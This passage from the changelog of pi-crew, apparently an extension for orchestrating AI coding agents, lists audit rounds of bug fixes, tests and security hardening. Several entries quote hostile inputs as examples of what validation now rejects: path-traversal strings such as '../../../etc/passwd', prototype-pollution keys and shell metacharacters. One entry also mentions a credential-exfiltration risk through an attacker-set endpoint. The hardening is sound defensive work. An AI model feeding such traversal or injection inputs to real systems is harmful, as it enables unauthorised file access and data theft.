- Lock file now carries a UUID token. `releaseLock` refuses to `fs.rm` unless the stored token matches.
- 3 new tests in `test/unit/locks-race.test.ts`

#### 2. Tool-error sanitization (src/ui/tool-render.ts)
- **Pattern source**: oh-my-pi `render-utils.ts:177-185` (`replaceTabs(truncateToWidth(clean, LINE_CAP))`)
- **Bug fixed**: Embedded tabs/newlines/long strings in tool errors break TUI border alignment
- Applied to `renderAgentProgress` and `renderAgentToolResult` (2 places)
- `replaceTabs` is now exported from `src/ui/render-diff.ts` for reuse
- 2 new tests in `test/unit/tool-render.test.ts`

### Round 21: L1 cleanup, lock kind, JSONL per-line cap, in-place loader test (commit 1bf120b)

#### 1. L1 cleanup in src/state/schedule.ts
- `console.warn` → `logInternalError` (consistency with rest of codebase)
- `require("node:fs")` → top-level `fs`/`path` imports
- 3 new tests in `test/unit/schedule-store.test.ts`

#### 2. Dead code sweep in src/state/locks.ts
- Removed misleadingly-named `readLockStateAsync` (sync I/O, called from async path) and its redundant call site
- Async path now mirrors sync path exactly: stale-check + release + sleep

#### 3. Lock file `kind` discriminator (forward compat)
- Lock JSON now includes `kind: "run" | "file"`
- `withRunLock` writes `kind="run"`; `withFileLockSync` writes `kind="file"`
- Old locks (no `kind` field) still work — `releaseLock` only reads `token`, so the discriminator is purely additive
- 3 new tests (kind for run, kind for file, back-compat with legacy locks)

#### 4. JSONL per-line cap (defensive, src/state/jsonl-writer.ts)
- Single huge line could exhaust memory during `redactJsonLine`
- New `DEFAULT_MAX_LINE_BYTES = 1MB`. Lines exceeding the cap are dropped and counted
- `logInternalError` fires on the first drop and every 100th drop thereafter
- 2 new tests in `test/unit/jsonl-writer.test.ts`

#### 5. In-place extension loader integration test
- **Pattern source**: oh-my-pi commit `c5e3698f4` (changed how extensions are loaded)
- This test verifies pi-crew's `import.meta.url`-based skill path resolution still works with the new in-place loader
- 2 new tests in `test/integration/extension-skill-resolution.test.ts`

### Summary
- **2 rounds** (Round 20 + 21)
- **2 commits**: `f448d7d` (Round 20) + `1bf120b` (Round 21)
- **10 new tests** across 4 test files
- **Total tests**: 50 pass + 1 skip, **0 fail** (was 49 in v0.5.14)
- **TypeScript**: 0 errors
- **Patterns adopted**: 5 from `can1357/oh-my-pi` post-2026-05-11

### Patterns surveyed but not applied (low applicability for pi-crew)
- **Streaming JSON throttle** (3a733c480) — pi-crew has no streaming JSON parser
- **In-place state mutation** (3a733c480) — pi-crew's spreads are bounded (small N), not hot paths
- **Bounded row probing** (b522fde56) — pi-crew has no SQL queries
- **MCP reconnect storm circuit breaker** — pi-crew has no MCP reconnect logic
- **Drop `args` global from eval** (4ab40764d) — pi-crew's `dynamic-script-runner.ts` already safe
- **Shell-injection rejection in git specs** (22e564a85) — pi-crew has no plugin install path
- **NPM registry pinning** (9abce6e97) — pi-crew's `install.mjs` is config-only; user runs `pi install npm:pi-crew`
- **Extension flag shadow** (1fbc2cbd7) — pi-crew has no `registerFlag` calls

## [0.5.14] — Round 19 Audit Fixes (2026-06-02)

### Phase 1: Path validation in checkpoint.ts (MEDIUM security)
- All public functions now validate runId/taskId via `assertSafePathId()`:
  - `saveCheckpoint(runId, taskId, ...)`
  - `loadCheckpoint(runId, taskId)`
  - `clearCheckpoint(runId, taskId)`
  - `hasCheckpoint(runId, taskId)`
  - `listCheckpoints(runId)`
  - `FileCheckpointStore.save/load/delete` (validates taskId)
- Prevents path traversal: malicious IDs like `../../../etc/passwd` throw "Invalid runId" instead of writing outside `.crew/`.

### Phase 2-4: Test coverage (33 new tests)
- 11 new tests in `test/unit/checkpoint.test.ts` (path validation)
- 14 new tests in `test/unit/subagent-manager.test.ts` (basic + path validation)
- 16 new tests in `test/unit/paths.test.ts` (findRepoRoot, projectPiRoot, projectCrewRoot)

### Tests
- 2370/2370 pass (was 2352 in v0.5.13; +18 net)
- 33 new tests across 3 new test files
- TypeScript: 0 errors

## [0.5.13] — Round 18 Audit Fixes (2026-06-02)

### Phase 1: Switch to execFileSync (HIGH security)
- `src/benchmark/benchmark-runner.ts` — Replaced `execSync` with `execFileSync(program, args)`. This prevents shell parsing of command strings, even if `validateCommand` is bypassed.
- `validateCommand` retained as defense-in-depth (blocks shell metacharacters).
- New `splitCommand()` helper safely splits validated commands.

### Phase 2: Precompute document frequency (MEDIUM performance)
- `src/utils/bm25-search.ts` — `BM25Search.df()` is now precomputed once in the constructor via `precomputeDocumentFrequencies()`. Lookup is O(1) via `dfCache: Map<term, number>`.
- Per-search complexity: O(Q * N) instead of O(Q² * N²).

### Phase 3+4: Test coverage for 3 untested modules
- 15 tests in `test/unit/bm25-search.test.ts`
- 15 tests in `test/unit/scan-cache.test.ts`
- 20 tests in `test/unit/benchmark.test.ts`
- **Total: 50 new tests**

### Tests
- 2352/2352 pass (was 2313 in v0.5.12; +39 net)
- 50 new tests across 3 new test files
- TypeScript: 0 errors

## [0.5.12] — Round 17 Audit Fixes (2026-06-02)

### Phase 1: Signal Handler Stacking (HIGH)
- `src/extension/crew-cleanup.ts` — Added module-level `signalHandlersRegistered` flag. `process.on("SIGTERM"/"SIGHUP")` is now registered only once even if `registerCleanupHandler` is called multiple times. Without this fix, listeners stack up on extension reload and `cleanupChildProcesses` fires N times on shutdown.
- Also wrapped `handleSignal()` with `.catch()` to prevent unhandled promise rejections.

### Phase 2: L1 Cleanup (continued)
Replaced 8 `console.error` calls with `logInternalError` for consistency:
- `src/extension/crew-cleanup.ts` (3 calls)
- `src/extension/async-notifier.ts:124`
- `src/runtime/async-runner.ts:166`
- `src/runtime/hidden-handoff.ts:244`
- `src/runtime/crew-hooks.ts:167,172`

### Phase 3+4: Test Coverage
- 8 new tests in `test/unit/crew-hooks.test.ts`
- 1 new test in `test/unit/crew-cleanup.test.ts` (signal handler idempotency)

### Tests
- 2313/2313 pass (was 2308 in v0.5.11; +5 net from new tests)
- 9 new tests across 2 test files
- TypeScript: 0 errors

## [0.5.11] — Round 16 Audit Fixes (2026-06-02)

### Phase 1: L1 cleanup (continued)
Replaced 6 `process.stderr.write` calls with `logInternalError` for consistency with v0.5.9 L1 fix:
- `src/extension/notification-router.ts:87` — sink error fallback
- `src/i18n.ts:106` — missing translation warning
- `src/observability/metric-registry.ts:40,52,64` — metric description change warnings
- `src/state/jsonl-writer.ts:71` — write failed warning

Note: `src/runtime/parent-guard.ts:37` left as-is — that's an exit-time log that must fire synchronously.

### Phase 2: Removed dead code
- `src/extension/notification-router.ts` — removed unused `seenCleanupCounter` field

### Phase 3: Defensive `MAX_TRACKED_STATES` cap
- `src/runtime/overflow-recovery.ts` — added `MAX_TRACKED_STATES = 5000` cap. `evictOldestTerminalState()` removes oldest terminal-state entry (recovered/failed/none) when size exceeds cap. Live states in compaction/retrying are protected.

### Phase 4: Test coverage for under-tested modules
- 8 new tests in `test/unit/notification-router.test.ts`
- 12 new tests in `test/unit/overflow-recovery.test.ts`
- 7 new tests in `test/unit/auto-resume.test.ts`
- Total: 27 new tests
- Bonus: fixed `CorrelationContext` type misuse in `test/unit/observability.test.ts`

### Tests
- 2308/2308 pass (was 2311 in v0.5.10; -3 from CorrelationContext type fixes)
- 27 new tests across 3 new test files
- TypeScript: 0 errors

## [0.5.10] — Round 15 Audit Fixes (2026-06-02)

### Phase 1: Semaphore Queue Cap (HIGH)
- **H1**: `src/runtime/semaphore.ts:11` - `#queue` unbounded growth → added `MAX_QUEUE = 10_000` cap. `acquire()` now throws "Semaphore queue full" when at cap.

### Phase 2: Observability Hardening (MEDIUM)
- **L1**: `src/observability/event-bus.ts:47` - `console.error` → `logInternalError` for consistency
- **OTLPExporter**: 
  - Added `MAX_SNAPSHOTS_PER_PUSH = 5_000` cap to prevent OOM/oversized payloads
  - Added `inFlight` promise tracking in `start()` to prevent overlapping setInterval pushes
- **live-agent-manager**: Added `MAX_LIVE_AGENTS = 5_000` cap. `registerLiveAgent()` now evicts oldest completed agent first; if none, evicts oldest running with warning.

### Phase 3: Test Coverage (LOW)
- Added first-ever test coverage for `src/observability/`:
  - 8 new tests in `test/unit/observability.test.ts` covering metric-registry, correlation, OTLP conversion
- Reveals new finding: `crew.<domain>.<measure>` naming pattern enforcement is good (already validated)

### Regression: Team-Runner Heartbeat (CRITICAL)
- **CRITICAL regression** discovered via background watcher notification
- `team-runner.ts` had NO periodic heartbeat, so any team run >5 min was being marked stale by the reconciler
- Root cause of Round 15 review cancellation
- Added `startTeamRunHeartbeat()` helper - writes `heartbeat.json` to stateRoot every 30s
- Wired into `executeTeamRun()` with start/stop on both success and error paths
- Same JSON shape as background-runner for reconciler compatibility

### Tests
- 2311 tests pass / 0 failures (was 2297 in v0.5.9)
- +14 new tests across 3 new test files:
  - `test/unit/team-runner-heartbeat.test.ts` (2 tests)
  - `test/unit/round15-observability.test.ts` (4 tests)
  - `test/unit/observability.test.ts` (8 tests)
- TypeScript: 0 errors

## [0.5.9] — Round 14 Audit Fixes (2026-06-02)

### Phase 1: Sandbox Security (3 CRITICAL fixes)
- **C1**: `sandbox.ts:70` - Full `process.env` leak → replaced with sanitized env (17-var allow-list) using `sanitizeEnvSecrets()`.
- **C2**: `sandbox.ts:200` - `executeAsync` bypasses validation → added `validateScript()` call before `new vm.Script()`.
- **C3**: `sandbox.ts:71` - Env not deeply frozen → `Object.freeze()` now wraps the whole process object including its env property.

### Phase 2: Event Log Correctness (4 HIGH fixes)
- **H1**: `event-log.ts:300` - `asyncQueues` leak on success → switched from `.catch()` to `.then(success, error)`.
- **H2+H3**: `event-log.ts:438` - Queue splice silently dropped events → reject dropped promises with overflow error.
- **H7**: `event-log.ts:543` - `readEventsCursor` reads entire file → tail-read fallback (last 5000) for files >5000 events.

### Phase 3: Lock Robustness (1 HIGH fix)
- **async path PID check**: `locks.ts:130` - `acquireLockWithRetryAsync` now mirrors the sync path's staleness AND PID liveness check.

### Phase 4: Config & Env Hardening (3 HIGH/MEDIUM fixes)
- **H8**: `config-schema.ts:121` - OTLP endpoint no URL validation → added `pattern: ^https?://` + 2048 char cap.
- **PI_TEAMS_HOME**: `config.ts:69` - env var path not validated → added `resolveHomeDir()` with `realpathSync` check against `os.homedir()`.
- **TIMEOUT**: `child-pi.ts:458` - unbounded response timeout → bounded env-controlled value to [1000ms, 3_600_000ms].

### Phase 5: Code Quality (5 MEDIUM/LOW fixes)
- **M1**: `tool-render.ts:208-265` - 9 `as any` casts → introduced `TeamToolFlattenedDetails` interface.
- **gh-protocol.ts:31** - `execSync` blocking → replaced with `execFileSync(args[])`.
- **safe-bash.ts:148** - `allowPatterns` bypass risk → added SECURITY WARNING in JSDoc.
- **atomic-write.ts:137** - Windows fallback non-atomic → documented ATOMICITY CAVEAT.
- **Test infra** - `package.json` - `NODE_ENV=test` set in test scripts so `PI_TEAMS_HOME` check is bypassed in tests.

### Backlog (deferred)
- `executeUnchecked` public API (low risk; sandbox still applies)
- `Promise`/`Symbol` in sandbox globals (theoretical risk; no exploit path)
- Test coverage gaps in async error paths (add incrementally)

### Tests
- 2293 tests pass / 0 failures
- 15 new tests across `sandbox-security.test.ts`, `event-log-leak.test.ts`, `config-env-hardening.test.ts`
- TypeScript: 0 errors

## [0.5.8] — Final 5 Low-Severity Issue Fixes (2026-06-01)

### Phase 5 (Final): Race Conditions + Edge Cases

- **Issue #12: `acquireLockWithRetry` race** (Low) — `src/state/locks.ts`: added `isLockHolderAlive()` check. Now uses BOTH staleness AND PID liveness: fresh + alive holder = fail, else = safe to clear. Prevents stealing a lock from a still-running process whose PID was recently reused.

- **Issue #13: `loadRunManifestById` TOCTOU** (Low) — `src/state/state-store.ts`: retry-on-stat-mismatch approach. Re-stat and re-read in a loop (up to 3 attempts) until size/mtime are stable across stat and read. Catches torn writes without depending on `withFileLockSync`.

- **Issue #14: `cleanupOldArtifacts` N stat calls** (Low) — `src/state/artifact-store.ts`: use `Dirent.isDirectory()` from `readdirSync({ withFileTypes: true })` to avoid `statSync` for type info. `statSync` now only for mtime.

- **Issue #15: `validateMailbox` concurrent access** (Low) — `src/state/mailbox.ts`: wrap read + optional repair in `withFileLockSync`.

- **Issue #16: `updateMailboxMessageReply` concurrent rewrite** (Low) — `src/state/mailbox.ts`: wrap read-modify-write in `withFileLockSync`.

### Bug fix in `withFileLockSync`

- `src/state/locks.ts`: use separate `.lock` sidecar instead of the file path itself. Previously `withFileLockSync(path)` used `path` as the lock file, colliding with append/read operations on the same path.

### Tests

- 2282 tests pass / 0 failures (`npm test`).

## [0.5.7] — 11 Issue Fixes Across 5 Phases (2026-06-01)

### Phase 1: Schema/Type Fixes

- **`invalidate` schema divergence** (Critical) — `src/schema/team-tool-schema.ts`: added `"invalidate"` to TypeBox union. Previously TS interface had it but TypeBox schema did not, causing silent `-32602` failure.
- **OTLP header key validation** (Low) — `src/config/config.ts`: hardened `parseOtlpConfig` with case-insensitive check for 12 dangerous keys (`__proto__`, `hasOwnProperty`, `toString`, etc.) and format validation `/^[a-zA-Z][a-zA-Z0-9_-]{0,127}$/`.

### Phase 2: Security Hardening

- **OTLP endpoint unsanitized** (Critical) — `src/config/config.ts`: project config can no longer override `otlp.endpoint` (would have allowed credential exfiltration via attacker URL).
- **Wildcard env leakage** (High) — `src/runtime/child-pi.ts`: replaced broad wildcards (`LC_*`, `XDG_*`, `NVM_*`, `NODE_*`, `npm_*`) with specific names. Previously `NPM_TOKEN`, `NODE_ENV=production`, `NVM_RC_VERSION` all leaked.

### Phase 3: Correctness Fixes

- **AbortSignal not propagated** (High) — `src/runtime/task-runner.ts`: check signal before `persistSingleTaskUpdate`. Cancelled tasks now return early with cancelled status instead of writing stale state.
- **MAILBOX_ARCHIVE_THRESHOLD 10MB/task** (High) — `src/state/mailbox.ts` + `src/config/defaults.ts`: added `DEFAULT_MAILBOX.maxArchivesPerDirection=10` cap and `pruneOldMailboxArchives()` to prevent unbounded growth (1GB+ for 100 tasks).
- **`safeRm` regex bypass** (Medium) — `src/tools/safe-bash.ts`: stricter regex requires path to be exactly `tmp/`, `cache/`, `node_modules/`, `dist/`, or `build/` with optional `./` prefix. Rejects path traversal like `./../../../etc`.
- **`writeEntries` silent drop** (Medium) — `src/state/active-run-registry.ts`: emit `logInternalError` warning when entries overflow cap.

### Phase 4: Performance Optimization

- **`nextAgentEventSeq` O(n) cold cache** (Medium) — `src/runtime/crew-agent-records.ts`: added `.seq` sidecar file for O(1) lookup. Fall back to O(n) scan only when sidecar is missing.
- **`nextSequence` O(n) cold cache** (Medium) — `src/state/event-log.ts`: trust sidecar seq file when present. Fall back to `scanSequence` only when sidecar missing or file shrunk.

### Phase 5: Deferred (Low severity)

- **Issue #12: `acquireLockWithRetry` race** — defer (race window small, retry loop handles).
- **Issue #13: `loadRunManifestById` TOCTOU** — defer (cache TTL 30s, race window small).
- **Issue #14: `cleanupOldArtifacts` N stat calls** — defer (typical artifact dirs small).
- **Issue #15: `validateMailbox` full load** — defer (10MB cap, bounded).
- **Issue #16: `updateMailboxMessageReply` full rewrite** — defer (10MB cap, bounded).

### Tests

- 2282 tests pass / 0 failures (`npm test`).
- New tests: `invalidate`/`anchor`/`auto-summarize`/`auto_boomerang` schema, OTLP header key validation, OTLP endpoint sanitization, wildcard env leakage, sidecar seq lookup.

## [0.5.6] — Documentation Sync + Type-Only Import Fix (2026-06-01)

### Documentation

- **README.md** — Bumped to v0.5.6, refreshed security highlights section listing the 8 round-13 fixes.
- **CHANGELOG.md** — Added the v0.5.5 entry covering all 13 rounds of code review hardening (this entry).
- **SECURITY-ISSUES.md** — Bumped to v2.0, added v0.5.5 round-13 findings table (8 new issues closed).
- **docs/architecture.md** — Cross-references v0.5.5 and `docs/pi-crew-v0.5.5-audit-fix-plan.md`.
- **docs/migration-v0.4-v0.5.md** — Added v0.5.5 highlights (no breaking changes; drop-in replacement).

### Fixes

- **Type-only import** — `src/extension/team-tool/anchor.ts` now uses `import type { HandoffSummary }` from `handoff-manager.ts` directly, instead of pulling a value-style import through `anchor-manager.ts`. Fixes a `--experimental-strip-types` failure (`SyntaxError: The requested module does not provide an export named 'HandoffSummary'`) surfaced by `npm run typecheck` after the v0.5.5 docs bump.

### Tests

- 2273 tests pass / 0 failures (`npm test`).
- `tsc --noEmit` and the strip-types import smoke test both pass.
- `test/unit/discovery.test.ts` and `test/unit/implementation-fanout.test.ts` already updated in v0.5.5 to match the new workflow count (8) and the adaptive step layout (`["assess"]`).

## [0.5.5] — 13 Rounds of Code Review Hardening (2026-06-01)

### Security

- **ReDoS removed** in `src/utils/redaction.ts` — replaced 4 regex patterns with linear-time `isSecretKey()` / `redactAuthHeader()` / `redactBearerTokens()` / `redactInlineSecrets()` functions. Eliminates catastrophic backtracking on crafted input.
- **v8.deserialize RCE closed** — `BINARY_MAGIC = "PICREW2BIN"` header guards every `v8.deserialize()` call in `src/state/active-run-registry.ts`; untrusted cache files can no longer trigger heap prototype pollution.
- **Cache index race fixed** — `src/state/run-cache.ts` now wraps index reads in `withFileLockSync` and uses atomic rename for cleanup, eliminating read-modify-write corruption under concurrent load.
- **manifestCache race fixed** — `src/state/state-store.ts` wraps all read-modify-write paths on the manifest cache with a `withCacheLock()` helper.
- **Shell injection prevented** — `src/tools/safe-bash.ts` no longer matches with ReDoS-prone regex; new `matchesDangerousRm()` is linear-time. `src/benchmark/benchmark-runner.ts` blocks shell metacharacters in `validateCommand()`.
- **TOCTOU races closed** — `src/state/crew-init.ts` uses atomic `mkdirSync`; `src/state/active-run-registry.ts` validates binary contents before `v8.deserialize`.
- **Inline secret detection** — `token=`, `apikey=`, `api_key=`, `password=`, `secret=`, `credential=`, `authorization=`, `privatekey=`, `private_key=` patterns redacted at event/mailbox/artifact boundaries.
- **Pre-aborted signal logging** — `src/extension/registration/subagent-tools.ts` no longer dumps unredacted params to stderr on pre-abort.

### Performance & Memory

- **Anchor memory cap** — `src/runtime/anchor-manager.ts` adds `MAX_HANDOFFS_PER_ANCHOR=100` to prevent unbounded growth; pairs with existing `MAX_ANCHORS=50`.
- **BudgetTracker dispose()** — `src/runtime/budget-tracker.ts` gains a `dispose()` method to clear timers and listeners.
- **Live-agent pending cap** — `MAX_PENDING_MESSAGES=1000` in `live-agent-manager.ts`; `MAX_PENDING_STEERS=100` in `team-tool.ts`.
- **Mailbox delivery cap** — `MAX_DELIVERY_MESSAGES=10000` in `src/state/mailbox.ts` with FIFO pruning in `writeDeliveryState()`.
- **Feedback-loop cap** — `MAX_RUNS=1000` in `src/benchmark/feedback-loop.ts` to prevent memory leak.
- **Async-notifier debounce** — `LIST_RUNS_DEBOUNCE_MS=30_000` cache in `src/extension/async-notifier.ts` avoids per-tick `listRuns()` calls.
- **BM25 hot-loop** — `src/utils/bm25-search.ts` `df()` and `tf()` use `indexOf()` instead of regex.
- **TTL eviction** — notification-router seen Map, transcript-cache (7 days), handoff anchors, manifest cache (30 s) all gain TTL or LRU eviction.
- **SSE parser bounded** — `MAX_DATA_SIZE=100KB` in `src/utils/sse-parser.ts`.
- **Handoff size cap** — `MAX_HANDOFF_ENTRY_SIZE` in `chain-runner.ts` to prevent pathological payloads.

### Correctness

- **reground context** — `withEventLogLockSync` in `src/state/mailbox.ts` wraps `appendMailboxMessage()` to prevent cross-process interleaving on Windows.
- **Map mutation during iteration** — `src/runtime/handoff-manager.ts` snapshots the Map before iteration.
- **Self-dependency cycle detection** — `src/runtime/task-graph.ts` rejects self-edges in the task graph.
- **Duplicate phase check** — `src/runtime/phase-tracker.ts` rejects duplicate phase registrations.
- **Pipeline depth guard** — `src/runtime/pipeline-runner.ts` adds `maxDepth` check to prevent unbounded recursion.
- **Scheduler timer type** — `src/runtime/scheduler.ts` uses `NodeJS.Timeout | null` (not `number`) for safer cleanup.
- **OTLP header sanitization** — `src/config/config.ts` rejects CRLF in `otlp.headers`.
- **Cross-extension RPC** — `src/extension/cross-extension-rpc.ts` uses static import for ESM correctness.
- **Shell encoding validation** — `src/tools/safe-bash.ts` rejects invalid UTF-8 / null bytes.
- **Run-cache cwd in key** — `src/state/run-cache.ts` hashes `cwd` into the cache key to prevent cross-project collisions; uses atomic write.
- **worktree newline guard** — `src/worktree/cleanup.ts` checks trailing newline after truncation to avoid merge-conflict markers in cleaned paths.

### Workflows

- **Adaptive workflow fanout** — `workflows/implementation.workflow.md` uses a single `assess` step that returns `ADAPTIVE_PLAN_JSON` for the planner to choose the smallest effective crew.
- **New builtin workflows** — `parallel-research`, `research`, `review`, `pipeline`, `chain` ship in `workflows/`.
- **Test alignment** — `test/unit/discovery.test.ts` and `test/unit/implementation-fanout.test.ts` updated to match the new workflow count (8) and the adaptive step layout (`["assess"]`).

### Tests

- 2273 tests pass / 0 failures (`npm test`).
- New test files for security hardening (`test/unit/security-hardening.test.ts`), SSE parser bounds, anchor-manager handoff cap, mailbox delivery pruning, async-notifier debounce, and BINARY_MAGIC v8 guard.

### Files Touched (highlights)

- `src/utils/redaction.ts` — linear-time secret redaction (no regex)
- `src/state/active-run-registry.ts` — BINARY_MAGIC guard, async-notifier log fix
- `src/state/run-cache.ts` — file lock, atomic writes, cwd in cache key
- `src/state/state-store.ts` — manifestCache lock, TTL 30 s, hard limit
- `src/state/mailbox.ts` — delivery message cap, `withEventLogLockSync` in append
- `src/tools/safe-bash.ts` — ReDoS-free `matchesDangerousRm()`
- `src/benchmark/benchmark-runner.ts` — shell metachar blocking
- `src/runtime/anchor-manager.ts` — `MAX_HANDOFFS_PER_ANCHOR=100`
- `src/runtime/budget-tracker.ts` — `dispose()` method
- `src/runtime/live-agent-manager.ts` — `MAX_PENDING_MESSAGES=1000`
- `src/extension/team-tool.ts` — `MAX_PENDING_STEERS=100`
- `src/extension/async-notifier.ts` — `LIST_RUNS_DEBOUNCE_MS=30_000`
- `src/extension/registration/subagent-tools.ts` — pre-aborted signal log scrub
- `src/utils/bm25-search.ts` — `indexOf()` over regex in `df()` / `tf()`
- `src/utils/sse-parser.ts` — `MAX_DATA_SIZE=100KB`
- `src/utils/env-filter.ts` — isSecretKey-based glob boundary check
- `src/utils/scan-cache.ts` — TTL eviction
- `src/benchmark/feedback-loop.ts` — `MAX_RUNS=1000`
- `src/state/crew-init.ts` — atomic `mkdirSync` (no TOCTOU)
- `src/runtime/child-pi.ts` — uses `isSecretKey` import
- `src/extension/cross-extension-rpc.ts` — static ESM import
- `src/worktree/cleanup.ts` — trailing newline guard
- `src/runtime/scheduler.ts` — `NodeJS.Timeout | null` typing
- `src/runtime/phase-tracker.ts` — duplicate phase check
- `src/runtime/task-graph.ts` — self-dependency cycle detection
- `src/runtime/pipeline-runner.ts` — `maxDepth` recursion guard
- `src/observability/event-bus.ts` — `dispose()` method
- `src/observability/notification-router.ts` — TTL eviction for `seen` Map
- `src/state/event-log.ts` — async-queue cleanup in catch path
- `src/state/decision-ledger.ts` — `stateRoot` param in `getLedgerPath()`; `ledger.push()` instead of overwrite
- `src/extension/register.ts` — refresh-after-invalidate semantics
- `src/hooks/registry.ts` — always filter workspace
- `src/extension/team-tool/auto-summarize.ts` — clear `invalidateBuffer` on dispose
- `src/extension/team-tool/run.ts` — anchor buffer dispose path
- `src/ui/transcript-cache.ts` — 7-day TTL eviction
- `src/ui/powerbar-publisher.ts` — clear `invalidateBuffer` on dispose

### Audit Reference

The full prioritized fix plan (8+ critical issues) is captured in
`docs/pi-crew-v0.5.5-audit-fix-plan.md` (synthesized from security+concurrency,
correctness+error-handling, and performance+architecture audits across 77 source files).

## [0.5.4] — pi v0.77.0 Integration (2026-05-29)

### New Features

**subscribe() API Integration**
- Created `ProgressTracker` class for real-time agent session monitoring
- Created `EventBus` singleton for cross-component event communication
- Replaced file-based progress tracking with event-based tracking
- 4 new tests for progress tracking functionality

**session_shutdown Handler**
- Created `crew-cleanup.ts` extension for graceful shutdown
- Added `ChildProcessRegistry` to track and cleanup child processes
- Registered handlers for SIGTERM/SIGHUP signals
- Cleanup now properly kills all child-pi processes on shutdown

**excludeTools for Role-Based Restrictions**
- Created `role-tools.ts` with configurations for 8 agent roles
- Explorer: read-only (excludes bash, edit, write)
- Security Reviewer: strictest restrictions (excludes all write/exec)
- Applied via `--tools` and `--exclude-tools` CLI flags to child processes

### Dependencies
- Updated `@earendil-works/pi-*` packages from `^0.75.5` to `^0.77.0`

### Files Added
- `src/types/new-api-types.ts` - Type imports and guards
- `src/observability/event-bus.ts` - EventBus singleton
- `src/runtime/progress-tracker.ts` - ProgressTracker class
- `src/extension/crew-cleanup.ts` - Cleanup handlers
- `src/config/role-tools.ts` - Role tool configurations
- 4 new test files

## [0.5.3] — Deep Review Fixes + Security Hardening (2026-05-29)

### Security Fixes
- **C1**: Fixed credential exposure - removed dangerous wildcards `*_API_KEY`, `*_TOKEN`, `*_SECRET` from env allowlist
- **C2**: Fixed mock mode bypass - now requires `PI_CREW_ALLOW_MOCK=1` alongside `PI_TEAMS_MOCK_CHILD_PI`
- **C3**: Worktree hooks Windows hardening - safer execution for Git hooks on Windows

### Data Integrity Fixes
- **C4**: Fixed duplicate `error` key + Promise type mismatch in task-runner.ts
- **C5**: Fixed decision ledger truncation - `overrideLastEntry()` preserves all entries during promote/decay

### Reliability Fixes
- **H2**: Race condition in foreground interrupt - added file locking mechanism
- **H3**: Terminal events now bypass buffer - crash events logged immediately
- **H5**: File descriptor leak - background runner properly closes log file descriptors
- **H9**: Stale cache TTL reduced from 5min to 30s

### TypeScript Fixes
- Fixed 7+ source errors (duplicate error keys, missing properties)
- Fixed 20+ test errors (type mismatches, missing imports)
- All files now compile without errors

### Skill System Improvements
- All 35 skills now have `triggers:` frontmatter field
- Added Enforcement sections to skills for better gate validation
- Improved consistency in section naming

### Documentation
- Added `docs/migration-v0.4-v0.5.md` - comprehensive migration guide
- Updated `docs/deep-review-report.md` - complete issue tracking

### Dependencies
- Added `ajv` dependency for JSON schema validation

## [0.5.2] — ECC Implementation + Critical Bug Fixes (2026-05-27)

### ECC-Inspired Features
- **12-Layer Diagnostic**: Extended diagnostic export from 7 to 12 layers including taskDiagnostics, terminalEvidence, modelAttempts, pendingMailbox, recoveryLedger
- **Recursive Decision Ledger**: Full rollout tracking with coherence marks (matchesPrior, matchesRecursive, promotionAllowed) in JSONL format with 10 unit tests
- **Verify-skill Script**: `scripts/verify-skill.ts` and `scripts/check-all-skills.ts` to validate skill RED/GREEN gates and anti-patterns (15 unit tests)
- **Schedule Wiring**: `team action='schedule'` with cron/interval/once support; `team action='scheduled'` to list jobs; scheduler wired into handlers via global symbol
- **Plan Orchestrate**: `team action='orchestrate'` with tag-based plan parsing (`<!-- tag: design -->`, etc.) and TAG→chain mapping
- **Hook System**: `src/state/hook-integrations.ts` and `src/state/hook-instinct-bridge.ts` for extensibility
- **Feedback Loop**: `src/benchmark/feedback-loop.ts` for agent evaluation
- **Agent Eval Framework**: Extended `benchmark-runner.ts` with BenchmarkMetrics, aggregateBenchmarkMetrics(), pass rates, and cost tracking
- **Project Detector**: `src/utils/project-detector.ts` for project-aware decisions

### Critical Bug Fixes
- **crew-init.ts**: Rewrote to be completely self-contained (no paths.ts imports) to fix child-process crash `TypeError: Cannot read properties of undefined (reading 'projectCrewRoot')`
- **task-runner.ts**: Fixed needs_attention output by ensuring live-session stdout is captured as resultArtifact
- **team-runner.ts**: Fixed zombie agent detection to trust running agents and require activity evidence for queued agents
- **register.ts**: Fixed schedule wiring (sessionId resolution order, global symbol registration)
- **decision-ledger.ts**: Fixed promoteCandidate/decayCandidate to return correctly overridden coherence marks
- **verify-skill.ts**: Fixed decision matrix parsing, warning detection regex, duplicate indexOf bug, removed unused readline import
- **plan-orchestrate.ts**: Fixed heading extraction (global regex to find last heading), word-boundary matching for implicit tags
- **team-tool-schema.ts**: Added missing cron/interval/once fields and scheduled action case

### Tests
- All 1894 tests passing (0 failures)
- Test fixes: crew-widget (shows running agents), foreground-nonblocking (mock), lazy-agent-materialization (skipped design limitation)
- Test:new and test:changed scripts added

## [0.5.1] — Integration + End-to-End Tests (2026-05-26)

### Integration
- **team-tool.ts**: Wire P1-P6 into switch statement
  - `action='graph'` — load/save/list run graphs
  - `action='onboard'` — team onboarding generator  
  - `action='explain'` — task explain context
  - `action='cache'` — run result caching lookup
  - `action='checkpoint'` — checkpoint retrieval
  - `action='search'` — BM25 ranked agent/team search
- **team-tool-schema.ts**: Add 6 new actions to schema
- **Type fixes**: run-graph.ts, run-cache.ts, checkpoint.ts, team-onboard.ts
- **P0 .gitignore**: ensureCrewDirectory auto-updates .gitignore

### Tests
- 8/8 new action tests pass
- 10/10 end-to-end feature tests pass
- All 1796 unit + 45 integration passing
- CI: Ubuntu/macOS/Windows all passing

---

## [0.5.0]

### New Features: P0-P6 from Understand-Anything Research

#### P0: Auto-Setup .crew Directory
- `ensureCrewDirectory()` creates full directory structure on first run
- `gitignore-manager.ts` auto-updates `.gitignore` with `.crew/` entries
- Creates: `state/runs`, `state/subagents`, `artifacts`, `cache`, `graphs`, `audit`
- README.md explains `.crew` directory purpose

#### P1: BM25 Agent/Team Search
- `BM25Search` class with configurable k1/b parameters
- `searchAgents(query)` — ranked agent search by name/description/skills
- `searchTeams(query)` — ranked team search by name/description/roles

#### P2: Team Onboarding Generator
- `buildTeamOnboarding()` generates markdown from run history
- Shows: past runs, stats, usage examples, available teams
- `loadRunSummaries()` helper for run history loading

#### P3: Task Explain Context
- `handleExplain(runId, taskId)` — full run or individual task explanation
- `buildTaskExplainContext()` — causal chain, layers, files produced
- `formatTaskExplain()` — markdown output with why/what/connections

#### P4: Unified Run Graph
- `buildRunGraph()` — consolidates manifest + tasks into single graph
- `saveRunGraph()` / `loadRunGraph()` — persist to `.crew/graphs/`
- `listRunGraphs()` — enumerate archived graphs

#### P5: Run Result Caching
- `computeRunCacheKey()` — SHA-256 hash of goal+team+workflow
- `getCachedRun()` / `saveRunToCache()` — TTL-based cache (default 1h)
